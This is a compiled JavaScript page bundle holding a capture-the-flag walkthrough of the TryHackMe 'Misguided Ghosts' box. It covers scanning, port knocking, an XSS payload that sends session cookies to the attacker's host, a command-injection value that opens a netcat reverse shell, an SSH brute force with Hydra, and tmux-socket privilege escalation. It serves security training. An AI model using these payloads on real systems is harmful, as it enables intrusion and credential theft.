"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3465],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>h});var s=t(67294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function r(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);n&&(s=s.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,s)}return t}function a(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?r(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):r(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,s,o=function(e,n){if(null==e)return{};var t,s,o={},r=Object.keys(e);for(s=0;s<r.length;s++)t=r[s],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(s=0;s<r.length;s++)t=r[s],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var l=s.createContext({}),p=function(e){var n=s.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):a(a({},n),e)),t},c=function(e){var n=p(e.components);return s.createElement(l.Provider,{value:n},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var n=e.children;return s.createElement(s.Fragment,{},n)}},m=s.forwardRef((function(e,n){var t=e.components,o=e.mdxType,r=e.originalType,l=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),d=p(t),m=o,h=d["".concat(l,".").concat(m)]||d[m]||u[m]||r;return t?s.createElement(h,a(a({ref:n},c),{},{components:t})):s.createElement(h,a({ref:n},c))}));function h(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var r=t.length,a=new Array(r);a[0]=m;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[d]="string"==typeof e?e:o,a[1]=i;for(var p=2;p<r;p++)a[p]=t[p];return s.createElement.apply(null,a)}return s.createElement.apply(null,t)}m.displayName="MDXCreateElement"},39597:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>u,frontMatter:()=>r,metadata:()=>i,toc:()=>p});var s=t(87462),o=(t(67294),t(3905));const r={},a="Misguided Ghosts",i={unversionedId:"Tryhackme/Misguided Ghosts/Misguided Ghost",id:"Tryhackme/Misguided Ghosts/Misguided Ghost",title:"Misguided Ghosts",description:"Explore your inner daemons with this hard box!",source:"@site/writeups/Tryhackme/Misguided Ghosts/Misguided Ghost.md",sourceDirName:"Tryhackme/Misguided Ghosts",slug:"/Tryhackme/Misguided Ghosts/Misguided Ghost",permalink:"/writeups/Tryhackme/Misguided Ghosts/Misguided Ghost",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Mindgames",permalink:"/writeups/Tryhackme/Mindgames/"},next:{title:"Mnemonic",permalink:"/writeups/Tryhackme/Mnemonic/"}},l={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Misguided Ghosts",id:"task-1-misguided-ghosts",level:2}],c={toc:p},d="wrapper";function u(e){let{components:n,...r}=e;return(0,o.kt)(d,(0,s.Z)({},c,r,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"misguided-ghosts"},"Misguided Ghosts"),(0,o.kt)("p",null,"Explore your inner daemons with this hard box!"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/misguidedghosts"},"Misguided Ghosts")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"FTP Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Port Knocking"),(0,o.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,o.kt)("li",{parentName:"ul"},"SSL Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Cookie Manipulation"),(0,o.kt)("li",{parentName:"ul"},"Code Injection"),(0,o.kt)("li",{parentName:"ul"},"Brute Forcing (Vigenere)"),(0,o.kt)("li",{parentName:"ul"},"SMB Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Brute FOrcing (SSH)"),(0,o.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-misguided-ghosts"},"Task 1 Misguided Ghosts"),(0,o.kt)("p",null,"Hard times, gonna make you wonder why you even try, Hard times, gonna take you down and laugh while you cry."),(0,o.kt)("p",null,"Like Hayley, you'll encounter some new stuff. There's no guidance for this box, good luck finding your way!"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ sudo nmap -A -sS -sC -sV -O 10.10.79.34\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 09:55 CET\nNmap scan report for 10.10.79.34\nHost is up (0.034s latency).\nNot shown: 997 closed ports\nPORT     STATE    SERVICE    VERSION\n21/tcp   open     ftp        vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 pub\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:10.8.106.222\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp   open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 d9:91:89:96:af:bc:06:b9:8d:43:df:53:dc:1f:8f:12 (RSA)\n|   256 25:0b:be:a2:f9:64:3e:f1:e3:15:e8:23:b8:8c:e5:16 (ECDSA)\n|_  256 09:59:9a:84:e6:6f:01:f3:33:8e:48:44:52:49:14:db (ED25519)\n8080/tcp filtered http-proxy\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/27%OT=21%CT=1%CU=41860%PV=Y%DS=2%DC=T%G=Y%TM=5F97E0\nOS:91%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 5900/tcp)\nHOP RTT      ADDRESS\n1   33.72 ms 10.8.0.1\n2   34.81 ms 10.10.79.34\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 19.29 seconds\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ ftp 10.10.79.34\nConnected to 10.10.79.34.\n220 (vsFTPd 3.0.3)\nName (10.10.79.34:kali): anonymous\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp>\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 pub\n226 Directory send OK.\nftp> cd pub\n250 Directory successfully changed.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 ftp      ftp           103 Aug 28 18:11 info.txt\n-rw-r--r--    1 ftp      ftp           248 Aug 26 18:51 jokes.txt\n-rw-r--r--    1 ftp      ftp        737512 Aug 18 18:12 trace.pcapng\n226 Directory send OK.\nftp> prompt off\nInteractive mode off.\nftp> mget *\nlocal: info.txt remote: info.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for info.txt (103 bytes).\n226 Transfer complete.\n103 bytes received in 0.08 secs (1.2136 kB/s)\nlocal: jokes.txt remote: jokes.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for jokes.txt (248 bytes).\n226 Transfer complete.\n248 bytes received in 0.11 secs (2.2531 kB/s)\nlocal: trace.pcapng remote: trace.pcapng\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for trace.pcapng (737512 bytes).\n226 Transfer complete.\n737512 bytes received in 0.38 secs (1.8431 MB/s)\nftp> exit\n221 Goodbye.\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ cat info.txt\nI have included all the network info you requested, along with some of my favourite jokes.\n\n- Paramore\nkali@kali:~/CTFs/tryhackme/Misguided Ghosts$ cat jokes.txt\nTaylor: Knock, knock.\nJosh:   Who's there?\nTaylor: The interrupting cow.\nJosh:   The interrupting cow--\nTaylor: Moo\n\nJosh:   Knock, knock.\nTaylor: Who's there?\nJosh:   Adore.\nTaylor: Adore who?\nJosh:   Adore is between you and I so please open up!\n")),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(13629).Z,width:"980",height:"207"})),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"7864 8273 9241 12007 60753")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"knock 10.10.79.34 7864 8273 9241 12007 60753\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ sudo nmap -A -sS -sC -sV -O 10.10.79.34\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 10:09 CET\nNmap scan report for 10.10.79.34\nHost is up (0.036s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE  VERSION\n21/tcp   open  ftp      vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 pub\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:10.8.106.222\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 d9:91:89:96:af:bc:06:b9:8d:43:df:53:dc:1f:8f:12 (RSA)\n|   256 25:0b:be:a2:f9:64:3e:f1:e3:15:e8:23:b8:8c:e5:16 (ECDSA)\n|_  256 09:59:9a:84:e6:6f:01:f3:33:8e:48:44:52:49:14:db (ED25519)\n8080/tcp open  ssl/http Werkzeug httpd 1.0.1 (Python 2.7.18)\n|_http-server-header: Werkzeug/1.0.1 Python/2.7.18\n|_http-title: Misguided Ghosts\n| ssl-cert: Subject: commonName=misguided_ghosts.thm/organizationName=Misguided Ghosts/stateOrProvinceName=Williamson Country/countryName=TN\n| Not valid before: 2020-08-11T16:52:11\n|_Not valid after:  2021-08-11T16:52:11\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/27%OT=21%CT=1%CU=43284%PV=Y%DS=2%DC=T%G=Y%TM=5F97E3\nOS:F9%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3306/tcp)\nHOP RTT      ADDRESS\n1   45.49 ms 10.8.0.1\n2   45.63 ms 10.10.79.34\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 51.92 seconds\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"https://10.10.79.34:8080/\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ gobuster dir -t 50 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.79.34:8080 -k 2>/dev/null\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            https://10.10.79.34:8080\n[+] Threads:        50\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/27 10:12:29 Starting gobuster\n===============================================================\n/login (Status: 200)\n/dashboard (Status: 302)\n/console (Status: 200)\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/27 10:18:15 Finished\n===============================================================\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://10.10.79.34:8080/login"},"https://10.10.79.34:8080/login")),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(39767).Z,width:"1121",height:"737"})),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"E = zac@misguided_ghosts.thm\nCN = misguided_ghosts.thm\nO = Misguided Ghosts\nL = Franklin\nST = Williamson Country\nC = TN\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"zac:zac")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://10.10.79.34:8080/dashboard"},"https://10.10.79.34:8080/dashboard")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-html"},'&lt;sscriptcript&gt;var i = new Image();i.src = "http://10.8.106.222/" +\ndocument.cookie;&lt;/sscriptcript&gt;\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ sudo python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\nkali\n10.8.106.222 - - [27/Oct/2020 10:30:19] code 404, message File not found\n10.8.106.222 - - [27/Oct/2020 10:30:19] "GET /login=zac_from_paramore HTTP/1.1" 404 -\n10.10.79.34 - - [27/Oct/2020 10:32:02] code 404, message File not found\n10.10.79.34 - - [27/Oct/2020 10:32:02] "GET /login=hayley_is_admin HTTP/1.1" 404 -\n')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"hayley_is_admin")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'gobuster dir -t 50 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.79.34:8080 -c "login=hayley_is_admin" -k 2>/dev/null\n')),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://10.10.79.34:8080/photos"},"https://10.10.79.34:8080/photos")),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(31810).Z,width:"1449",height:"328"})),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(52422).Z,width:"487",height:"262"})),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://10.10.79.34:8080/photos?image=."},"https://10.10.79.34:8080/photos?image=.")),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(2756).Z,width:"455",height:"392"})),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"image=.;nc${IFS}10.8.106.222${IFS}9001${IFS}-e${IFS}/bin/sh\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ nc -lnvp 9001\nListening on 0.0.0.0 9001\nConnection received on 10.10.79.34 43255\nid\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"cd /home/zac\nls\nnotes\nls -la\ntotal 12\ndrwxr-xr-x    3 root     root          4096 Oct 27 09:08 .\ndrwxr-xr-x    1 root     root          4096 Oct 27 09:08 ..\ndrwxrwxr-x    2 1001     1001          4096 Aug 26 02:11 notes\ncd notes\nls -la\ntotal 16\ndrwxrwxr-x    2 1001     1001          4096 Aug 26 02:11 .\ndrwxr-xr-x    3 root     root          4096 Oct 27 09:08 ..\n-rw-r--r--    1 1001     1002          1675 Aug 25 00:14 .id_rsa\n-rw-r--r--    1 1001     1002           270 Aug 25 00:34 .secret\ncat .secret\nZac,\n\nI know you can never remember your password, so I left your private key here so you don't have to use a password. I ciphered it in case we suffer another hack, but I know you remember how to get the key to the cipher if you can't remember that either.\n\n- Paramore\ncat .id_rsa\n-----BEGIN RSA PRIVATE KEY-----\nNCBXsnNMYBEVTUVFawb9f8f0vbwLpvf0hfa1PYy0C91sYIG/U5Ss15fDbm2HmHdS\nCgGHOkqGhIucEqe4mrcwZRY3ooKX2uB8IxJ6Ke9wM6g8jOayHFw2/UPWnveLxUQq\n0Z/g9X5zJjaHfPI62OKyOFPEx7Mm0mfB5yRIzdi0NEaMmxR6cFGZuBaTOgMWRIk6\naJSO7oocDBsVbpuDED7SzviXvqTHYk/ToE9Rg/kV2sIpt7Q0D0lZNhz7zTo79IP0\nTwAa61/L7ctOVRwU8nmYFoc45M0kgs5az0liJloOopJ5N3iFPHScyG0lgJYOmeiW\nQQ8XJJqqB6LwRVE7hgGW7hvNM5TJh4Ee6M3wKRCWTURGLmJVTXu1vmLXz1gOrxKG\na60TrsfLpVu6zfWEtNGEwC4Q4rov7IZjeUCQK9p+4Gaegchy1m5RIuS3na45BkZL\n4kv5qHsUU17xfAbpec90T66Iq8sSM0Je8SiivQFyltwc07t99BrVLe9xLjaETX/o\nDIk3GCMBNDui5YhP0E66zyovPfeWLweUWZTYJpRsyPoavtSXMqKJ3M4uK00omAEY\ncXcpQ+UtMusDiU6CvBfNFdlgq8Rmu0IU9Uvu+jBBEgxHovMr+0MNMcrnYmGtTVHe\ngYUVd7lraZupxArh1WHS8llbj9jgQ5LhyAiGrx6vUukyFZ8IDTjA5BmmoBHPvmbj\nmwRx+RJNeZYT3Pl/1Qe8Uc4IAim3Y7yzMMfoZodw/g2G2qx4sNjYLJ8Mry6RJ8Fq\nwf2ES1WOyNOHjQ2iZ1JrXfJnEc/hU1J3ZLhY7p6oO+DAd7m5HomDik/vUTXlS3u1\nA1Pr4XRZW0RYggysRmUTqVEiuTIMY4Y0LhIbY/Vo8pg6OTyKL0+ktaCDaRXEnZBp\nVU1ABBWoGPfXgUpEOsvgafreUVHnyeYru8n4L8WB/V7xUk56mcU6pobmD3g19T6n\nddocO8sVX6W8mhPVllsc6l+Xl4enJUmReXmXaiPiHoch1oaCgrYYmsONThM7QUut\noOIGdb6O/3qfZA+V+EIm3tP+3U/+RsurKmrpVIFWzRIRuj90aBhOzNBsAHloOlOB\nLCuVjI5M6VuXJ+YY9M9biS2qafFUgIUaKYMVdzDtJFkMhACpJqpy+w6owW0hn3vA\nH6gpsbnl3zm3ey0JMqnDbwWqKFWTU6DK8V5o6whXZJRXJb1Lxs38PiAry9TPRGVA\nM5EY0XxjniOoesweDGHryeJNeZV9iRP/CAV0LGDx7FAtl3a7p3DGb2qz0FL6Dyys\nvgh73EndW0xa6N8clLyA1/GR5x54h+ayGzMQa8d4ZdAhWl+CZMpTjqEEYKRL9/Xc\neXU3MNVuPeDrqdjYGg+4xXtSaLwSbOmGwH/aED2j4xxgraMo3Bp+raHGmOEex/RL\n1nCbZKDUkUP3Cv8mc9AAVs8UN6O6/nZo1pISgJyPjuUyz7S/paSz04x7DjY80Ema\nr8WpMKfgl3+jWta+es1oL6DtD9y7RD5u9RPSXGNt/3QwNu+xNlle39laa8UZayPI\nVhBUH4wvFSmt0puRjBgE6Y5smOxoId18IFKZL1mko1Y68nLNMJsj\n-----END RSA PRIVATE KEY-----\n\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://en.wikipedia.org/wiki/Known-plaintext_attack"},"https://en.wikipedia.org/wiki/Known-plaintext_attack")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://github.com/bobloblaw321/vigenereBruteForce"},"https://github.com/bobloblaw321/vigenereBruteForce")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ grep -ie ^[a-z]*$ /usr/share/wordlists/rockyou.txt >> wordlist.txt\nkali@kali:~/CTFs/tryhackme/Misguided Ghosts$ node vigenere_brute_force.js -w wordlist.txt -c NCB -u MII\n----------------------------------------------\nCooking up some keys\nBob Loblaw's Vigenere Cipher Brute Force tool\n----------------------------------------------\n\nThe key is: butterfly\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ ssh -i id_rsa zac@10.10.118.136\nThe authenticity of host '10.10.118.136 (10.10.118.136)' can't be established.\nECDSA key fingerprint is SHA256:lwZSBIMEUyCAAp1GbfZxfjHOYrY4UplzuJl2VWsR8QE.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.118.136' (ECDSA) to the list of known hosts.\nWelcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n System information disabled due to load higher than 1.0\n\n * Are you ready for Kubernetes 1.19? It's nearly here! Try RC3 with\n   sudo snap install microk8s --channel=1.19/candidate --classic\n\n   https://microk8s.io/ has docs and details.\n\n * Canonical Livepatch is available for installation.\n   - Reduce system reboots and improve kernel security. Activate at:\n     https://ubuntu.com/livepatch\n\n8 packages can be updated.\n0 updates are security updates.\n\n\nLast login: Wed Aug 26 14:27:15 2020 from 192.168.236.128\nzac@misguided_ghosts:~$ netstat -tulpn\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 127.0.0.1:139           0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:43537         0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:445           0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:38915         0.0.0.0:*               LISTEN      -\ntcp6       0      0 ::1:139                 :::*                    LISTEN      -\ntcp6       0      0 :::21                   :::*                    LISTEN      -\ntcp6       0      0 :::22                   :::*                    LISTEN      -\ntcp6       0      0 ::1:445                 :::*                    LISTEN      -\nudp        0      0 0.0.0.0:44135           0.0.0.0:*                           -\nudp        0      0 127.0.0.53:53           0.0.0.0:*                           -\nudp        0      0 10.10.118.136:68        0.0.0.0:*                           -\nzac@misguided_ghosts:~$\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ smbclient -L localhost -p 1234\nEnter WORKGROUP\\kali's password:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        local           Disk      Local list of passwords for our services\n        IPC$            IPC       IPC Service (misguided_ghosts server (Samba, Ubuntu))\nSMB1 disabled -- no workgroup available\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ cat passwords.bak\npft7vPl\nHQ@5Y64\nLs7kZxv\nKPBRFJz\nfKtBSbx\nFWbnrxr\nKz#SPqn\nc4CTRWm\n5asYk73\nWikHqvi\naBc123!\nJPXxIMs\nAHwbOmm\ntXWsJ3J\nQJPQWW0\n3bmBhNv\nxV!sce1\n1bJP1af\nDLH4cgw\nbRBdPRk\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ hydra -l hayley -P passwords.bak ssh://10.10.118.136\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-27 12:20:41\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:1/p:20), ~2 tries per task\n[DATA] attacking ssh://10.10.118.136:22/\n[22][ssh] host: 10.10.118.136   login: hayley   password: aBc123!\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 2 final worker threads did not complete until end.\n[ERROR] 2 targets did not resolve or could not be connected\n[ERROR] 0 targets did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-27 12:20:44\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"hayley@misguided_ghosts:~$ ls\nuser.txt\nhayley@misguided_ghosts:~$ cat user.txt\n{d0ck3r_35c4p3}\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"hayley@misguided_ghosts:~$ ps -aux | grep root\nroot      1070  0.0  0.1  28540  3624 ?        Ss   11:13   0:00 /usr/bin/tmux -S /opt/.details new -s vpn -d\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"hayley@misguided_ghosts:/opt$ tmux -S /opt/.details\n\n# id\nuid=0(root) gid=0(root) groups=0(root)\n# cat /root/root.txt\n{p1v0t1ng_15_fun}\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"What is the user flag?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"{d0ck3r_35c4p3}")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"What is the root flag?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"{p1v0t1ng_15_fun}")))}u.isMDXComponent=!0},13629:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/2020-10-27_10-03-dac811ce74f13c40cd67fd4754955fa3.png"},39767:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/2020-10-27_10-22-5b68f1f4f96d6c8da8ba749e96a79da9.png"},31810:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/2020-10-27_10-36-5c856a6f039ac0e7032865b3630cd1db.png"},52422:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/2020-10-27_10-37-fcf1625487e151ba63a9ba8b6218459c.png"},2756:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/2020-10-27_10-42-f38b8e4bb1862140567cfcd71dd8a5c4.png"}}]);